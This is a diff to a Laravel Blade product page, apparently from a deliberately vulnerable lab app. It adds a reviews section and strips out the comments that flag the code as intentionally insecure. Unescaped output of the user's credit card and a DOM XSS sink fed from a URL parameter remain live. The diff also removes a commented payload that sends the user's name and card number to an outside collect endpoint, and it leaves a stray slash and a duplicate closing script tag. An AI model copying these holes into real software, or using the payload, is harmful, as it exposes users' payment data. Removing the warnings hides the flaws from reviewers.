@@ -13,7 +13,6 @@
 </div>
 
 @auth
-<!-- Vulnerable user information display (intentionally insecure for XSS demonstration) -->
 <div class="card mb-3">
     <div class="card-header bg-info text-white">
         User Information
@@ -27,12 +26,10 @@
                 <p><strong>Credit Card:</strong> <span id="user-credit">{!! auth()->user()->credit_card !!}</span></p>
             </div>
         </div>
-        <!-- Search history will be displayed here -->
         <div id="search-history"></div>
     </div>
 </div>
 @endauth
-<!-- Search form with vulnerable output -->
 <form id="search-form">
     <div class="row">
         <div class="col col-sm-2">
@@ -84,8 +81,13 @@
                 </div>
                 <div class="col col-sm-12 col-lg-8 mt-3">
                     <div class="row mb-2">
-					    <div class="col-8">
+					    <div class="col-6">
 					        <h3>{{$product->name}}</h3>
+					    </div>
+					    <div class="col col-2">
+                            @auth
+					        <a href="{{route('reviews.create', $product->id)}}" class="btn btn-primary form-control">Add Review</a>
+                            @endauth
 					    </div>
 					    <div class="col col-2">
                             @can('edit_products')
@@ -106,14 +108,41 @@
                         <tr><th>Price</th><td>{{$product->price}}</td>
                         <tr><th>Description</th><td>{{$product->description}}</td></tr>
                     </table>
+
+                
+                    <div class="mt-4">
+                        <h4>Customer Reviews</h4>
+                        @if($product->reviews->count() > 0)
+                            @foreach($product->reviews as $review)
+                                <div class="card mb-2">
+                                    <div class="card-body">
+                                        <div class="d-flex justify-content-between">
+                                            <h5 class="card-title">
+                                                @for($i = 1; $i <= 5; $i++)
+                                                    @if($i <= $review->rating)
+                                                        <i class="fas fa-star text-warning"></i>
+                                                    @else
+                                                        <i class="far fa-star text-warning"></i>
+                                                    @endif
+                                                @endfor
+                                            </h5>
+                                            <small class="text-muted">{{ $review->created_at->format('M d, Y') }}</small>
+                                        </div>
+                                        <h6 class="card-subtitle mb-2 text-muted">By: {{ $review->user->name }}</h6>
+                                        <p class="card-text">{{ $review->comment }}</p>
+                                    </div>
+                                </div>
+                            @endforeach
+                        @else
+                            <p class="text-muted">No reviews yet. Be the first to review this product!</p>
+                        @endif
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 @endforeach
-<!-- Vulnerable DOM XSS implementation -->
 <script>
-// Function to parse URL parameters (vulnerable to DOM XSS)
 function getUrlParameter(name) {
     name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
     var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -121,12 +150,9 @@ function getUrlParameter(name) {
     return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
 }
 
-// DOM XSS vulnerability: directly inserting URL parameter into DOM
 document.addEventListener('DOMContentLoaded', function() {
-    // Get the search parameter from URL
     var searchTerm = getUrlParameter('keywords');
 
-    // Add to search history (vulnerable to DOM XSS)
     if (searchTerm) {
         var historyDiv = document.getElementById('search-history');
         if (historyDiv) {
@@ -136,15 +162,12 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // Add event listener to search form
     document.getElementById('search-form').addEventListener('submit', function(e) {
         var keywords = document.getElementById('search-keywords').value;
-        // Log search activity
         logSearchActivity(keywords);
     });
 });
 
-// Function to log search activity (sends data to collect endpoint)
 function logSearchActivity(keywords) {
     fetch('/collect?activity=search&keywords=' + encodeURIComponent(keywords))
         .then(response => response.json())
@@ -152,8 +175,8 @@ function logSearchActivity(keywords) {
         .catch(error => console.error('Error logging activity:', error));
 }
 
-// Reflected XSS payload example (for educational purposes):
-// <script>fetch('http://websecservice.localhost.com/collect?name='+document.getElementById('user-name').innerText+'&credit='+document.getElementById('user-credit').innerText);</script>
+/
+</script>
 </script>
 @endsection
 
